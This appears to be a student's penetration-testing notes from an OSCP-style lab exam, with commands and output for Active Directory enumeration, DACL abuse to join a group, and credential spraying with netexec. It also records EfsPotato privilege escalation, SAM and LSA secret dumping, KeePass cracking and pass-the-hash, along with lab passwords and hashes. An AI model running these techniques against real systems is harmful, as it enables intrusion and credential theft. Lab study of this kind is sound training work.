[2026-07-09T16:54:48Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=oscp,DC=exam
[2026-07-09T16:54:48Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-09T16:55:37Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=oscp,DC=exam
[2026-07-09T16:55:37Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-09T16:55:39Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=oscp,DC=exam
[2026-07-09T16:55:39Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-07-09T16:55:41Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=oscp,DC=exam
[2026-07-09T16:55:41Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-07-09T16:55:41Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-07-09T16:55:41Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-07-09T16:55:41Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-07-09T16:55:41Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-07-09T16:55:41Z INFO  rusthound_ce::json::maker::common] 26 users parsed!
[2026-07-09T16:55:41Z INFO  rusthound_ce::json::maker::common] 68 groups parsed!
[2026-07-09T16:55:41Z INFO  rusthound_ce::json::maker::common] 3 computers parsed!
[2026-07-09T16:55:41Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-07-09T16:55:41Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-07-09T16:55:41Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-07-09T16:55:41Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-07-09T16:55:41Z INFO  rusthound_ce::json::maker::common] .//20260710005541_oscp-exam_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 00:55:41 on 07/10/26! Happy Graphing!


```

### help-desk

![Pasted image 20260710005944.png](/ob/Pasted%20image%2020260710005944.png)

![Pasted image 20260710010007.png](/ob/Pasted%20image%2020260710010007.png)

```
evil-winrm-py PS C:\ProgramData>  Get-NetDomain


Forest                  : oscp.exam
DomainControllers       : 
Children                : 
DomainMode              : Unknown
DomainModeLevel         : 7
Parent                  : 
PdcRoleOwner            : 
RidRoleOwner            : 
InfrastructureRoleOwner : 
Name                    : oscp.exam


```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $python /usr/share/doc/python3-impacket/examples/dacledit.py -action 'write' -rights 'WriteMembers' -principal 'v.perry' -target-dn 'CN=HELPDESK USERS,CN=USERS,DC=OSCP,DC=EXAM' 'oscp.exam'/'v.perry':'SurfaceConditionMove441' -dc-ip 172.16.124.200
/usr/share/doc/python3-impacket/examples/dacledit.py:101: SyntaxWarning: invalid escape sequence '\V'
  'S-1-5-83-0': 'NT VIRTUAL MACHINE\Virtual Machines',
/usr/share/doc/python3-impacket/examples/dacledit.py:110: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-554': 'BUILTIN\Pre-Windows 2000 Compatible Access',
/usr/share/doc/python3-impacket/examples/dacledit.py:111: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-555': 'BUILTIN\Remote Desktop Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:112: SyntaxWarning: invalid escape sequence '\I'
  'S-1-5-32-557': 'BUILTIN\Incoming Forest Trust Builders',
/usr/share/doc/python3-impacket/examples/dacledit.py:114: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-558': 'BUILTIN\Performance Monitor Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:115: SyntaxWarning: invalid escape sequence '\P'
  'S-1-5-32-559': 'BUILTIN\Performance Log Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:116: SyntaxWarning: invalid escape sequence '\W'
  'S-1-5-32-560': 'BUILTIN\Windows Authorization Access Group',
/usr/share/doc/python3-impacket/examples/dacledit.py:117: SyntaxWarning: invalid escape sequence '\T'
  'S-1-5-32-561': 'BUILTIN\Terminal Server License Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:118: SyntaxWarning: invalid escape sequence '\D'
  'S-1-5-32-562': 'BUILTIN\Distributed COM Users',
/usr/share/doc/python3-impacket/examples/dacledit.py:119: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-569': 'BUILTIN\Cryptographic Operators',
/usr/share/doc/python3-impacket/examples/dacledit.py:120: SyntaxWarning: invalid escape sequence '\E'
  'S-1-5-32-573': 'BUILTIN\Event Log Readers',
/usr/share/doc/python3-impacket/examples/dacledit.py:121: SyntaxWarning: invalid escape sequence '\C'
  'S-1-5-32-574': 'BUILTIN\Certificate Service DCOM Access',
/usr/share/doc/python3-impacket/examples/dacledit.py:122: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-575': 'BUILTIN\RDS Remote Access Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:123: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-576': 'BUILTIN\RDS Endpoint Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:124: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-577': 'BUILTIN\RDS Management Servers',
/usr/share/doc/python3-impacket/examples/dacledit.py:125: SyntaxWarning: invalid escape sequence '\H'
  'S-1-5-32-578': 'BUILTIN\Hyper-V Administrators',
/usr/share/doc/python3-impacket/examples/dacledit.py:126: SyntaxWarning: invalid escape sequence '\A'
  'S-1-5-32-579': 'BUILTIN\Access Control Assistance Operators',
/usr/share/doc/python3-impacket/examples/dacledit.py:127: SyntaxWarning: invalid escape sequence '\R'
  'S-1-5-32-580': 'BUILTIN\Remote Management Users',
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260710-012929.bak
[*] DACL modified successfully!

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $bloodyAD --host 172.16.124.200 -d oscp.exam -u v.perry -p 'SurfaceConditionMove441' add groupMember 'HELPDESK USERS' v.perry
[+] v.perry added to HELPDESK USERS

```

```
PS C:\ProgramData> net user v.perry /domain
net user v.perry /domain
The request will be processed at a domain controller for domain oscp.exam.

User name                    v.perry
Full Name                    
Comment                      Receptionist
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/11/2025 9:35:10 AM
Password expires             Never
Password changeable          8/12/2025 9:35:10 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/9/2026 10:08:57 AM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *HelpDesk Users       
The command completed successfully.

```

### asp

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $ impacket-GetUserSPNs oscp.exam/v.perry:'SurfaceConditionMove441' -dc-ip 172.16.124.200 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!

```

### r.gallagher

```
SMB         172.16.124.200  445    DC20             [+] oscp.exam\r.gallagher:BackupPassword2026 (Pwn3d!)
```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}...";  netexec $proto 172.16.124.200  -u r.gallagher  -p  BackupPassword2026  $auth --continue-on-success ; done; done

[*] Testing smb ...
SMB         172.16.124.200  445    DC20             [*] Windows Server 2022 Build 20348 x64 (name:DC20) (domain:oscp.exam) (signing:True) (SMBv1:None)
SMB         172.16.124.200  445    DC20             [+] oscp.exam\r.gallagher:BackupPassword2026 (Pwn3d!)

[*] Testing smb (local-auth)...
SMB         172.16.124.200  445    DC20             [*] Windows Server 2022 Build 20348 x64 (name:DC20) (domain:DC20) (signing:True) (SMBv1:None)
SMB         172.16.124.200  445    DC20             [-] DC20\r.gallagher:BackupPassword2026 STATUS_LOGON_FAILURE 

[*] Testing winrm ...
WINRM       172.16.124.200  5985   DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam) 
WINRM       172.16.124.200  5985   DC20             [+] oscp.exam\r.gallagher:BackupPassword2026 (Pwn3d!)

[*] Testing winrm (local-auth)...
WINRM       172.16.124.200  5985   DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam) 
WINRM       172.16.124.200  5985   DC20             [-] DC20\r.gallagher:BackupPassword2026

[*] Testing wmi ...
RPC         172.16.124.200  135    DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam)
WMI         172.16.124.200  135    DC20             [+] oscp.exam\r.gallagher:BackupPassword2026 (Pwn3d!)

[*] Testing wmi (local-auth)...
RPC         172.16.124.200  135    DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam)
RPC         172.16.124.200  135    DC20             [-] DC20\r.gallagher:BackupPassword2026 (RPC_S_ACCESS_DENIED)

[*] Testing rdp ...

[*] Testing rdp (local-auth)...

[*] Testing ssh ...

[*] Testing ssh (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress]
               [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing ldap ...
LDAP        172.16.124.200  389    DC20             [*] Windows Server 2022 Build 20348 (name:DC20) (domain:oscp.exam) (signing:None) (channel binding:No TLS cert) 
LDAP        172.16.124.200  389    DC20             [+] oscp.exam\r.gallagher:BackupPassword2026 (Pwn3d!)

[*] Testing ldap (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress]
               [--log LOG] [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing mssql ...

[*] Testing mssql (local-auth)...

[*] Testing ftp ...

```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $evil-winrm-py -i 172.16.124.200  -u r.gallagher   -p "BackupPassword2026"
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '172.16.124.200:5985' as 'r.gallagher'
evil-winrm-py PS C:\Users\r.gallagher\Documents>
```

```
evil-winrm-py PS C:\Users\r.gallagher\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
evil-winrm-py PS C:\Users\r.gallagher\Documents>

```

### SeImpersonatePrivilege

```
evil-winrm-py PS C:\Users\r.gallagher\Documents> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe .\EfsPotato.cs -nowarn:1691,618
Microsoft (R) Visual C# Compiler version 4.8.4161.0

for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.



This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240


```

```
evil-winrm-py PS C:\Users\r.gallagher\Documents> ./EfsPotato.exe whoami
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: OSCP\r.gallagher
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=622190)
[+] Get Token: 888
[!] process with pid: 4168 created.
==============================
nt authority\system

```

```
evil-winrm-py PS C:\Users\r.gallagher\Documents> .\EfsPotato.exe "cmd /c type C:\Users\Administrator\Desktop\proof.txt > C:\ProgramData\temp\
proof.txt 2>&1"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: OSCP\r.gallagher
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=6a0a80)
[+] Get Token: 880
[!] process with pid: 3828 created.
==============================
evil-winrm-py PS C:\Users\r.gallagher\Documents> type C:\ProgramData\temp\proof.txt
 
24fcc2866d292795e54e601236f290d5

```

***

# #  Recon 172.16.124.202

### \[\[PORT & IP SCAN]]

### loop

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}...";  netexec $proto 172.16.124.202 -u v.perry -p  SurfaceConditionMove441  $auth --continue-on-success ; done; done

[*] Testing smb ...

[*] Testing smb (local-auth)...

[*] Testing winrm ...
WINRM       172.16.124.202  5985   SRV22            [*] Windows Server 2022 Build 20348 (name:SRV22) (domain:oscp.exam) 
WINRM       172.16.124.202  5985   SRV22            [+] oscp.exam\v.perry:SurfaceConditionMove441 (Pwn3d!)

[*] Testing winrm (local-auth)...
WINRM       172.16.124.202  5985   SRV22            [*] Windows Server 2022 Build 20348 (name:SRV22) (domain:oscp.exam) 
WINRM       172.16.124.202  5985   SRV22            [-] SRV22\v.perry:SurfaceConditionMove441

[*] Testing wmi ...
RPC         172.16.124.202  135    SRV22            [*] Windows Server 2022 Build 20348 (name:SRV22) (domain:oscp.exam)
WMI         172.16.124.202  135    SRV22            [+] oscp.exam\v.perry:SurfaceConditionMove441 (Pwn3d!)

[*] Testing wmi (local-auth)...
RPC         172.16.124.202  135    SRV22            [*] Windows Server 2022 Build 20348 (name:SRV22) (domain:oscp.exam)
RPC         172.16.124.202  135    SRV22            [-] SRV22\v.perry:SurfaceConditionMove441 (RPC_S_ACCESS_DENIED)

[*] Testing rdp ...
RDP         172.16.124.202  3389   SRV22            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV22) (domain:oscp.exam) (nla:True)
RDP         172.16.124.202  3389   SRV22            [+] oscp.exam\v.perry:SurfaceConditionMove441 (Pwn3d!)

[*] Testing rdp (local-auth)...
RDP         172.16.124.202  3389   SRV22            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV22) (domain:SRV22) (nla:True)
RDP         172.16.124.202  3389   SRV22            [-] SRV22\v.perry:SurfaceConditionMove441 (STATUS_LOGON_FAILURE)

[*] Testing ssh ...

[*] Testing ssh (local-auth)...
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--no-progress] [--log LOG]
               [--verbose | --debug] [-6] [--dns-server DNS_SERVER] [--dns-tcp] [--dns-timeout DNS_TIMEOUT]
               {wmi,winrm,vnc,ssh,rdp,nfs,ldap,ftp,smb,mssql} ...
netexec: error: unrecognized arguments: --local-auth

[*] Testing ldap ...

```

### winrm

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $evil-winrm-py -i 172.16.124.202   -u v.perry   -p "SurfaceConditionMove441"
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '172.16.124.202:5985' as 'v.perry'
evil-winrm-py PS C:\Users\v.perry\Documents>


```

### SeBackupPrivilege

```
evil-winrm-py PS C:\programdata\temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled

```

```
evil-winrm-py PS C:\Users\v.perry\Documents> robocopy /b C:\users\administrator\desktop C:\programdata\temp

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows                              
-------------------------------------------------------------------------------

  Started : Thursday, July 9, 2026 11:43:34 AM
   Source : C:\users\administrator\desktop\
     Dest : C:\programdata\temp\

    Files : *.*
	    
  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30 

------------------------------------------------------------------------------

	  New Dir          3	C:\users\administrator\desktop\
	    New File  		    2517	Confidential.kdbx
  0%  
100%  
	    New File  		     282	desktop.ini
  0%  
100%  
	    New File  		      34	proof.txt
  0%  
100%  

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         1         0         0         0         0
   Files :         3         3         0         0         0         0
   Bytes :     2.7 k     2.7 k         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :             202,357 Bytes/sec.
   Speed :              11.579 MegaBytes/min.
   Ended : Thursday, July 9, 2026 11:43:34 AM


```

```
evil-winrm-py PS C:\programdata\temp> type proof.txt
5a027a84548b9afcd063bcf755d1fa26
evil-winrm-py PS C:\programdata\temp> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.124.202
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.124.254

```

![Pasted image 20260710024607.png](/ob/Pasted%20image%2020260710024607.png)

### admin

```
evil-winrm-py PS C:\programdata\temp> ls


    Directory: C:\programdata\temp


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-a----         8/21/2025   6:50 AM           2517 Confidential.kdbx                                                     
-a----          7/9/2026   6:08 AM             34 proof.txt                                                             


```

```
evil-winrm-py PS C:\programdata\temp> download Confidential.kdbx .
Downloading C:\programdata\temp\Confidential.kdbx: 64.0kB [00:00, 651MB/s]                                                                  
[+] File downloaded successfully and saved as: /home/tester/Desktop/offsec/oscpRealexam/Confidential.kdbx

```

```
┌─[✗]─[tester@parrot]─[~/Desktop/offsec/oscpRealexam/john/run]
└──╼ $./keepass2john ~/Desktop/offsec/oscpRealexam/Confidential.kdbx > kdbx.hash


```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam/john/run]
└──╼ $./john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [AES/Argon2 256/256 AVX2])
Cost 1 (t (rounds)) is 47 for all loaded hashes
Cost 2 (m) is 65536 for all loaded hashes
Cost 3 (p) is 2 for all loaded hashes
Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes
Will run 12 OpenMP threads
Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
123456789        (Confidential)     
1g 0:00:00:05 DONE (2026-07-10 03:16) 0.1821g/s 2.186p/s 2.186c/s 2.186C/s 123456..daniel
Use the "--show" option to display all of the cracked passwords reliably
Session completed
[ble: elapsed 5.740s (CPU 909.5%)] ./john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash

```

```
sudo apt install keepassxc
```

![Pasted image 20260710031941.png](/ob/Pasted%20image%2020260710031941.png)

![Pasted image 20260710032040.png](/ob/Pasted%20image%2020260710032040.png)

administrator

password

```
FinanceWebPortal203
MyAwesomePass555
BackupPassword2026
RDPPass221
```

ev

```
for ip in 172.16.124.200 172.16.124.202 ; do
  for pass in FinanceWebPortal203 MyAwesomePass555 BackupPassword2026 RDPPass221; do
    echo "[*] Testing $ip with $pass (local-auth)"
     nxc smb $ip -u administrator -p "$pass" --local-auth
  done
done
```

### SAM

```
evil-winrm-py PS C:\Program Files> reg save HKLM\SAM C:\programdata\temp\sam.save
 
The operation completed successfully.

evil-winrm-py PS C:\Program Files> reg save HKLM\SYSTEM C:\programdata\temp\system.save
 
The operation completed successfully.

evil-winrm-py PS C:\Program Files> reg save HKLM\SECURITY C:\programdata\temp\security.save
The operation completed successfully.
```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $/usr/share/doc/python3-impacket/examples/secretsdump.py -sam ./sam.save -system system.save -security security.save LOCAL
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbaa1921794e12123522d23a0adaac5c6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ea29f79cccc4725ddef4eadc9a41d42f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:10c62cf6f5bed437cecf481621747b60:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:29b5ef2eb3c1a09b6fda60cbbdbe4cbda03ae35927c236f35c254f0e99e001202598f6635a32554e0f055334149008f3798b507fac14d6b6718e2c95749d54d1af64fca952f152dec6eaf4f4016e4347e00d60202b1b4133e7b16fc67dc80e3352930eda84d313033b8552679e472ab60e4fc3d5d0c822022165734b924afcb3a0ddb070ba13a02d731a49f1e0dbd668fe46c398ef132e1311c00e795acdf46dc9b4010ef0b73466a04b31394492fcf8263c97aa3d04c32d3eb9cf18aefb9a101be8b96589d9d8b1714fb5fb5149bd650120d439eab3d4243e240010a597480f3443202287a856c86190323d537f667c
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:0cb3d3c689d455b5cb565cdd049e8604
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x67e5fb10998f1344936fa6a6519266798eadf26f
dpapi_userkey:0x5981b3ef3363a97e9529556565f17d3c47870cbf
[*] NL$KM 
 0000   62 12 D3 CE 09 68 0A 3E  E9 54 FE 2E AB 01 34 3B   b....h.>.T....4;
 0010   D2 0F 64 C9 A0 76 6C 35  BB 95 D1 93 9C 1B D9 1D   ..d..vl5........
 0020   44 62 AE 95 5F 09 1C 4A  79 2F AA 6A 5A 8C 2A D6   Db.._..Jy/.jZ.*.
 0030   C4 D7 D3 49 0B 96 5C 8A  03 02 F0 99 E2 60 D6 4D   ...I..\......`.M
NL$KM:6212d3ce09680a3ee954fe2eab01343bd20f64c9a0766c35bb95d1939c1bd91d4462ae955f091c4a792faa6a5a8c2ad6c4d7d3490b965c8a0302f099e260d64d
[*] Cleaning up... 

```

```
─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $nxc smb 172.16.124.202 -u administrator -H 'ea29f79cccc4725ddef4eadc9a41d42f' --local-auth
SMB         172.16.124.202  445    SRV22            [*] Windows Server 2022 Build 20348 x64 (name:SRV22) (domain:SRV22) (signing:False) (SMBv1:None)
SMB         172.16.124.202  445    SRV22            [+] SRV22\administrator:ea29f79cccc4725ddef4eadc9a41d42f (Pwn3d!)
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $nxc smb 172.16.124.200 -u administrator -H 'ea29f79cccc4725ddef4eadc9a41d42f' --local-auth
SMB         172.16.124.200  445    DC20             [*] Windows Server 2022 Build 20348 x64 (name:DC20) (domain:DC20) (signing:True) (SMBv1:None)
SMB         172.16.124.200  445    DC20             [-] DC20\administrator:ea29f79cccc4725ddef4eadc9a41d42f STATUS_LOGON_FAILURE 
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $nxc smb 192.168.124.206 -u administrator -H 'ea29f79cccc4725ddef4eadc9a41d42f' --local-auth
SMB         192.168.124.206 445    WS26             [*] Windows 11 Build 22000 x64 (name:WS26) (domain:WS26) (signing:False) (SMBv1:None)
SMB         192.168.124.206 445    WS26             [-] WS26\administrator:ea29f79cccc4725ddef4eadc9a41d42f STATUS_LOGON_FAILURE 

```

```
for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}...";  netexec $proto 172.16.124.202 -u administrator -H ea29f79cccc4725ddef4eadc9a41d42f  $auth --continue-on-success ; done; done
```

```
for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}...";  netexec $proto 172.16.124.202 -u administrator -H ea29f79cccc4725ddef4eadc9a41d42f  $auth --continue-on-success ; done; done
```

```
┌─[tester@parrot]─[~/Desktop/offsec/oscpRealexam]
└──╼ $for proto in smb winrm wmi rdp ssh ldap mssql ftp; do for auth in "" "--local-auth"; do echo -e "\n[*] Testing $proto ${auth:+(local-auth)}...";  netexec $proto 172.16.124.202 -u administrator -H ea29f79cccc4725ddef4eadc9a41d42f  $auth --continue-on-success ; done; done

[*] Testing smb ...
SMB         172.16.124.202  445    SRV22            [*] Windows Server 2022 Build 20348 x64 (name:SRV22) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         172.16.124.202  445    SRV22            [-] oscp.exam\administrator:ea29f79cccc4725ddef4eadc9a41d42f STATUS_LOGON_FAILURE 

[*] Testing smb (local-auth)...
SMB         172.16.124.202  445    SRV22            [*] Windows Server 2022 Build 20348 x64 (name:SRV22) (domain:SRV22) (signing:False) (SMBv1:None)
SMB         172.16.124.202  445    SRV22            [+] SRV22\administrator:ea29f79cccc4725ddef4eadc9a41d42f (Pwn3d!)

[*] Testing winrm ...
WINRM       172.16.124.202  5985   SRV22            [*] Windows Server 2022 Build 20348 (name:SRV22) (domain:oscp.exam) 
WINRM       172.16.124.202  5985   SRV22            [-] oscp.exam\administrator:ea29f79cccc4725ddef4eadc9a41d42f

[*] Testing winrm (local-auth)...
WINRM       172.16.124.202  5985   SRV22            [*] Windows Server 2022 Build 20348 (name:SRV22) (domain:oscp.exam) 
WINRM       172.16.124.202  5985   SRV22            [+] SRV22\administrator:ea29f79cccc4725ddef4eadc9a41d42f (Pwn3d!)

